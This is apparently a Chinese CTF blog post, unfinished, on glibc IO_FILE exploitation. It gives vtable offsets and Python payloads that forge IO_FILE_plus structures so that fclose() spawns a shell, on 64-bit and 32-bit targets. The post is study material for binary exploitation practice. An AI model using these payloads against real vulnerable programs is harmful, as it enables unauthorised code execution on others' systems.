---
title: IO_FILE ALl_in_one
date: 2018-11-06 20:46:15
tags:
---
IO_FILE 总结 未完成...
<!--more-->
# Start
最近看到HItcon2018的babytcache发现IO_FILE还是博大精深，之前对于IO_FILE的理解还是十分稚嫩只知道orange和普通的利用...
尔后又看了老钟的博客感觉IO_FILE神奇的很! 收获满满
[老钟博客传送点][1]
开始自己动手把lowkey师傅的课件的题探索一遍...
感觉lowkey师傅的课件还是循循善诱当时基础太差没领会其中奥妙...
开始写前膜一波angelboy lowkey zs0zrc
# 0x00 IO_FILE Basic
像是一些我們熟悉的gets puts 都和IO_FILE有关
基础部分之前在[echo][2]和[orange][3]介绍过一些就不介绍了

# 0x01 fclose()_getshell

在32bit系统中，_IO_jump_t的偏移是0x94，64bit系统中偏移是0xE8

64位:
* 存在后门情况
```python
payload='\x00'*0x10+p64(sh)+"\x00"*0x70+p64(buf)
payload=payload.ljust(0xd8,'\x00')+p64(buf)
payload=payload.ljust(0x100)#充填防髒數據
```
* 不存在后门情况
```python
payload="/bin/sh".ljust(0x10,'\x00')+p64(system)+"\x00"*0x70+p64(buf+0x20)#此处地址上值为0
payload=payload.ljust(0xd8,'\x00')+p64(buf+0x10-0x88)
payload=payload.ljust(0x100,'\x00')#防止脏数据
```

32位：
伪造IO_FILE_plus结构体, 32位和64位不一样，32位的需要伪造vtable,而64位可以不用伪造vtable，因为64位的在绕过几个函数后会获得一次call [rax + 0x10]的机会（zs0zrc）
```python
#存在後門sh use_IO_new_fclose
payload="".ljust(0x48,'\x00')+p32(buf)+p32(sh)
payload=payload.ljust(0x94,'\x00')+p32(buf+0x4c-0x8)
payload=payload.ljust(0x100,"\x00")
#不存在後門情況 use __fclose
payload="/bin/sh".ljust(0x48,'\x00')+p32(buf+8)+p32(system)#0ff 0x48 處指向地址值位0
payload=payload.ljust(0x94,'\x00')+p32(buf-0x44+0x4c)
payload=payload.ljust(0x100,"\x00")

```




[1]:https://www.jianshu.com/p/a6354fa4dbdf
[2]:https://n132.github.io/IO-FILE-IO-buf-base/
[3]:https://n132.github.io/house-of-orange/


